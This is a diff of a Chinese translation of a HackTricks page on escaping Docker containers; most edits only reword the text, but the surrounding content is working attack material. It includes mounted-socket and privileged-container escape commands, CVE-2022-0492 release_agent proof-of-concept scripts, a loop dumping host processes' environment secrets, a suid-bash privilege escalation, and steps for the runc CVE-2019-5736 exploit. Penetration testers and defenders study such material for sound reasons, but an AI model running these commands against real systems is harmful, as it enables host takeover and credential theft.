@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
+<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 如果你想在**HackTricks中看到你的公司广告**或者**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
 * 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
@@ -22,17 +22,17 @@
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## 自动枚举与逃逸
+## 自动枚举 & 逃逸
 
 * [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): 它也可以**枚举容器**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 这个工具非常**有用，用于枚举您所在的容器甚至尝试自动逃逸**
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 这个工具非常**有用，用于枚举你所在的容器甚至尝试自动逃逸**
 * [**amicontained**](https://github.com/genuinetools/amicontained): 有用的工具，用于获取容器的权限，以便找到逃离它的方法
 * [**deepce**](https://github.com/stealthcopter/deepce): 枚举和逃离容器的工具
 * [**grype**](https://github.com/anchore/grype): 获取安装在镜像中的软件包含的CVEs
 
 ## 挂载的Docker Socket逃逸
 
-如果你发现**docker socket被挂载**在docker容器内部，你将能够从中逃离。\
+如果你发现**docker socket被挂载**在docker容器内部，你将能够从中逃逸。\
 这通常发生在出于某种原因需要连接到docker守护进程以执行操作的docker容器中。
 ```bash
 #Search the socket
@@ -54,7 +54,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-如果**docker socket位于意外位置**，您仍然可以使用带参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与之通信。
+如果**docker socket位于意外的位置**，您仍然可以使用带有参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与之通信。
 {% endhint %}
 
 Docker守护进程也可能[在端口上监听（默认为2375、2376）](../../../../network-services-pentesting/2375-pentesting-docker.md)，或者在基于Systemd的系统上，与Docker守护进程的通信可以通过Systemd socket `fd://`进行。
@@ -70,21 +70,21 @@ Docker守护进程也可能[在端口上监听（默认为2375、2376）](../../
 * ...
 {% endhint %}
 
-## Capabilities Abuse Escape
+## 权限滥用逃逸
 
-您应该检查容器的capabilities，如果它具有以下任何一个，您可能能够从中逃脱：**`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+您应该检查容器的权限，如果它具有以下任何权限，您可能能够从中逃脱：**`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-您可以使用**之前提到的自动化工具**或以下方法检查当前容器的capabilities：
+您可以使用**之前提到的自动化工具**或以下方法检查当前容器的权限：
 ```bash
 capsh --print
 ```
-在以下页面中，您可以**了解更多关于linux capabilities**以及如何滥用它们来逃脱/提升权限：
+在以下页面中，您可以**了解更多关于linux capabilities**以及如何滥用它们来逃逸/提升权限：
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## 从特权容器逃脱
+## 从特权容器逃逸
 
 可以使用`--privileged`标志或禁用特定防御来创建特权容器：
 
@@ -98,7 +98,7 @@ capsh --print
 * `--cgroupns=host`
 * `挂载 /dev`
 
-`--privileged`标志引入了重大的安全问题，利用依赖于启用它的docker容器。使用此标志时，容器可以完全访问所有设备，并且不受seccomp、AppArmor和Linux capabilities的限制。您可以在此页面中**阅读`--privileged`的所有影响**：
+`--privileged`标志引入了重大的安全问题，利用此漏洞依赖于启动一个启用了它的docker容器。使用此标志时，容器可以完全访问所有设备，并且不受seccomp、AppArmor和Linux capabilities的限制。您可以在此页面中**阅读`--privileged`的所有影响**：
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
@@ -106,15 +106,15 @@ capsh --print
 
 ### 特权 + hostPID
 
-拥有这些权限，您可以只需执行以下操作：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`，就可以**移动到主机上作为root运行的进程的命名空间**，比如init（pid:1）。
+拥有这些权限，您可以只需执行以下命令，就可以**移动到主机上作为root运行的进程的命名空间**，比如init（pid:1）：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
-在容器中执行以下操作进行测试：
+在容器中执行以下命令来测试它：
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### 特权
 
-仅使用特权标志，您可以尝试**访问主机的磁盘**或尝试通过滥用 release\_agent 或其他逃逸手段**逃脱**。
+仅使用特权标志，您可以尝试**访问主机的磁盘**或尝试**通过滥用 release\_agent 或其他逃逸技术来逃脱**。
 
 在容器中执行以下绕过测试：
 ```bash
@@ -132,11 +132,11 @@ mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
 ```markdown
-而且瞧！您现在可以访问宿主机的文件系统，因为它被挂载在 `/mnt/hola` 文件夹中。
+And voilà ! 您现在可以访问宿主机的文件系统，因为它被挂载在 `/mnt/hola` 文件夹中。
 
 #### 挂载磁盘 - Poc2
 
-在容器内部，攻击者可能会尝试通过由集群创建的可写 hostPath 卷来进一步访问底层宿主操作系统。以下是您可以在容器内检查的一些常见事项，以查看是否可以利用这个攻击向量：
+在容器内部，攻击者可能会尝试通过集群创建的可写 hostPath 卷来进一步访问底层宿主操作系统。以下是一些您可以在容器内检查的常见事项，以查看是否可以利用这个攻击向量：
 ```
 ```bash
 ### Check if You Can Write to a File-system
@@ -158,7 +158,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### 利用现有的 release\_agent 实现特权逃逸 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### 利用现有的 release\_agent 进行特权逃逸 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
 {% code title="初始 PoC" %}
 ```bash
@@ -194,7 +194,7 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### 利用创建的 release\_agent 滥用特权逃逸 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### 利用创建的 release\_agent 实现特权逃逸 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 
 {% code title="第二个 PoC" %}
 ```bash
@@ -238,10 +238,10 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 # Reads the output
 cat /output
 ```
-```
+```markdown
 {% endcode %}
 
-查找该技术的**解释**：
+查看该技术的**解释**：
 
 {% content-ref url="docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
@@ -314,7 +314,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-在具有特权的容器内执行PoC应该会提供类似于以下的输出：
+执行 PoC 在一个特权容器内应该提供类似的输出：
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -361,14 +361,14 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 
 ### 任意挂载
 
-在多种情况下，你会发现**容器从主机挂载了一些卷**。如果这个卷没有正确配置，你可能能够**访问/修改敏感数据**：读取秘密，更改ssh authorized\_keys…
+在多种情况下，你会发现**容器从主机挂载了一些卷**。如果这个卷没有正确配置，你可能能够**访问/修改敏感数据**：读取秘密，更改ssh authorized\_keys……
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
 ### 使用两个 shell 和主机挂载进行权限提升
 
 如果您作为**容器内的 root 用户**，并且挂载了来自主机的某个文件夹，同时您已经作为一个非特权用户**逃逸到主机**并且对挂载的文件夹有读取权限。\
-您可以在**容器**内的**挂载文件夹**中创建一个**bash suid 文件**，然后从**主机**上执行它来进行权限提升。
+您可以在**容器**内的**挂载文件夹**中创建一个**bash suid 文件**，然后从**主机**上**执行它**以进行权限提升。
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -378,7 +378,7 @@ bash -p #From non priv inside mounted folder
 ```
 ### 使用两个 shell 的权限提升
 
-如果你作为**容器内的 root 用户**访问，并且你已经**作为非特权用户逃逸到宿主机**，如果你在容器内拥有 MKNOD 能力（默认情况下就有），你可以利用这两个 shell 在宿主机内**提升权限**，正如[**这篇文章中解释的**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
+如果你作为**容器内的 root 用户**访问，并且你已经**作为非特权用户逃逸到宿主机**，如果你在容器内拥有 MKNOD 能力（默认情况下就有），你可以利用两个 shell 在宿主机内**提升权限**，正如[**这篇文章中解释的**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
 拥有这种能力的容器内 root 用户被允许**创建块设备文件**。设备文件是用来**访问底层硬件和内核模块**的特殊文件。例如，/dev/sda 块设备文件允许**读取系统磁盘上的原始数据**。
 
 Docker 确保块设备**不能在容器内被滥用**，通过在容器上设置一个 cgroup 策略来阻止对块设备的读写。\
@@ -426,9 +426,9 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-例如，您可以使用类似 `ps auxn` 的命令列出进程，并在命令中搜索敏感细节。
+例如，您可以使用 `ps auxn` 列出进程，并在命令中搜索敏感细节。
 
-然后，由于您可以**在 /proc/ 中访问主机的每个进程，您可以通过运行以下命令来窃取它们的环境变量中的秘密**：
+然后，由于您可以**在 /proc/ 中访问主机的每个进程，您可以通过运行以下命令来窃取它们的 env 密钥**：
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -447,26 +447,26 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-你还可以**杀死进程并导致服务拒绝（DoS）**。
+您还可以**杀死进程并导致服务拒绝（DoS）**。
 
 {% hint style="warning" %}
-如果你不知怎么地拥有了容器外部某个进程的特权**访问权限**，你可以运行类似 `nsenter --target <pid> --all` 或 `nsenter --target <pid> --mount --net --pid --cgroup` 的命令，以**以该进程相同的命名空间限制（希望没有）运行一个shell。**
+如果您不知怎么地拥有了容器外部某个进程的特权**访问权限**，您可以运行类似 `nsenter --target <pid> --all` 或 `nsenter --target <pid> --mount --net --pid --cgroup` 的命令，以**以与该进程相同的命名空间限制（希望没有）运行一个shell。**
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-如果容器配置了Docker[宿主网络驱动(`--network=host`)](https://docs.docker.com/network/host/)，该容器的网络栈不会与Docker宿主机隔离（容器共享宿主机的网络命名空间），且容器不会分配自己的IP地址。换句话说，**容器将所有服务直接绑定到宿主机的IP上**。此外，容器可以**拦截宿主机在共享接口`tcpdump -i eth0`上发送和接收的所有网络流量**。
+如果容器配置了Docker[宿主网络驱动(`--network=host`)](https://docs.docker.com/network/host/)，该容器的网络栈不与Docker宿主隔离（容器共享宿主的网络命名空间），且容器不会分配自己的IP地址。换句话说，**容器将所有服务直接绑定到宿主的IP上**。此外，容器可以**拦截宿主在共享接口`tcpdump -i eth0`上发送和接收的所有网络流量**。
 
-例如，您可以使用此功能来**嗅探甚至伪造宿主机与元数据实例之间的流量**。
+例如，您可以使用此方法**嗅探甚至伪造宿主和元数据实例之间的流量**。
 
 如以下示例所示：
 
 * [写作：如何联系Google SRE：在云SQL中植入一个shell](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [元数据服务MITM允许根权限提升（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-您还将能够访问宿主机内绑定到localhost的**网络服务**，甚至访问**节点的元数据权限**（这些权限可能与容器可以访问的权限不同）。
+您还将能够访问宿主内部绑定到localhost的**网络服务**，甚至访问**节点的元数据权限**（这些权限可能与容器可以访问的权限不同）。
 
 ### hostIPC
 ```
@@ -487,11 +487,11 @@ cat /proc/self/status | grep CapEff
 ```
 ### 用户命名空间通过符号链接滥用
 
-在帖子[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)中解释的第二种技术表明，你可以滥用绑定挂载与用户命名空间，以影响主机内部的文件（在那个特定案例中，删除文件）。
+在帖子[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)中解释的第二种技术表明，你可以滥用用户命名空间的绑定挂载，以影响主机内的文件（在那个特定案例中，删除文件）。
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。
+使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -500,9 +500,9 @@ cat /proc/self/status | grep CapEff
 
 ### Runc 漏洞 (CVE-2019-5736)
 
-如果你能够以 root 身份执行 `docker exec`（可能需要通过 sudo），你可以尝试通过滥用 CVE-2019-5736（[这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)有漏洞利用程序）来提升权限，从容器中逃逸。这项技术基本上会**覆盖**容器**从容器中**的 _**/bin/sh**_ 二进制文件，因此任何执行 docker exec 的人可能会触发有效载荷。
+如果你能够以 root 身份执行 `docker exec`（可能需要通过 sudo），你可以尝试通过滥用 CVE-2019-5736（[这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)有漏洞利用程序）来提升权限，从容器中逃逸。这项技术基本上会**覆盖**容器**主机**的 _**/bin/sh**_ 二进制文件，因此任何执行 docker exec 的人可能会触发有效载荷。
 
-根据需要更改有效载荷并使用 `go build main.go` 构建 main.go。生成的二进制文件应放置在 docker 容器中执行。
+根据需要更改有效载荷并使用 `go build main.go` 构建 main.go。生成的二进制文件应放置在 docker 容器中执行。\
 执行后，一旦显示 `[+] Overwritten /bin/sh successfully`，你需要从主机上执行以下操作：
 
 `docker exec -it <container-name> /bin/sh`
@@ -548,7 +548,7 @@ cat /proc/self/status | grep CapEff
 ```
 {% endtab %}
 
-{% tab title="arm64 syscalls" %}
+{% tab title="arm64 系统调用" %}
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -632,7 +632,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
